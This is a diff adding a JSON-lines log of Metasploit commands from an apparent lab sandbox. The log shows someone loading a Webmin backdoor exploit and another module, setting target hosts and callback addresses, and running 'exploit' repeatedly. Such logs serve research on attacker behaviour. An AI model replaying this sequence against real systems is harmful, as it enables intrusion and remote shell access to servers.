@@ -1,0 +1,28 @@
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:14:22.810311+02:00", "cmd_type": "msf-command", "cmd": "use 47230.rb"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:14:54.244609+02:00", "cmd_type": "msf-command", "cmd": "show targets"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:15:46.693943+02:00", "cmd_type": "msf-command", "cmd": "set TARGET 0"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:15:49.298946+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:16:23.872149+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:17:38.094607+02:00", "cmd_type": "msf-command", "cmd": "set TARGETURI /root/"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:17:42.338829+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:18:51.901438+02:00", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.1"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:18:53.866526+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:20:07.450672+02:00", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor "}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:20:11.368976+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:20:16.448923+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:20:43.543800+02:00", "cmd_type": "msf-command", "cmd": "set TARGET 0"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:20:46.134105+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:21:22.260053+02:00", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.5"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:21:26.144413+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:22:32.944063+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 0.0.0.0"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:22:38.554089+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:23:16.653531+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:23:46.764622+02:00", "cmd_type": "msf-command", "cmd": "set TARGETURI /root/"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:23:50.931496+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:24:02.778498+02:00", "cmd_type": "msf-command", "cmd": "set TARGETURI /"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:24:05.936239+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:24:31.233117+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:24:53.715587+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 127.0.0.1"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:24:59.194411+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:27:21.945805+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 192.168.131.153"}
+{"sandbox_id": "43", "timestamp_str": "2020-07-15T10:28:26.363201+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
